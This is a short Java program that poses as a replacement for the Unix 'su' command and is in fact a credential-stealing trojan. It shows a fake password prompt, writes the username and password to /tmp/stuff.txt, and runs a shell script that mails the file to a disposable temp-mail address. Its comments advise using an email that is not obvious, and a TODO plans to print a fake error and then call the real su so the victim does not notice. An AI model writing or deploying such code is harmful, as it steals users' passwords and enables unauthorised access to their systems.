// 7-31-2020
// su replacement
// run as: java su "username"
//
// TODO: Add error message after pass is inputted and call the real su program afterwards

import java.lang.Runtime;
import java.util.*;
import java.io.*;

class su {
	public static void main(String[] args) {
		Console cnsl = null;
		try {
			// Get password from user
			cnsl = System.console();
			char[] pass = cnsl.readPassword( "Password:" );
			// Send to file
			FileWriter f = new FileWriter( "/tmp/stuff.txt", true );
			BufferedWriter bw = new BufferedWriter( f );
			bw.write( args[0] + ":" + String.valueOf( pass ));
			bw.newLine();
			bw.close();
			// Send pass file to mail
			String[] arr = new String[ 3 ];
			arr[ 0 ] = "sh";
			arr[ 1 ] = "send.sh";
			// Change to whatever email to be used ( not an obvious or main one )
			// https://temp-mail.org/en/
			arr[ 2 ] = "yiliw43316@keinmail.com";
			Process p = Runtime.getRuntime().exec( arr, null );
		} catch ( Exception e ){
			e.printStackTrace();
		}
	}
}
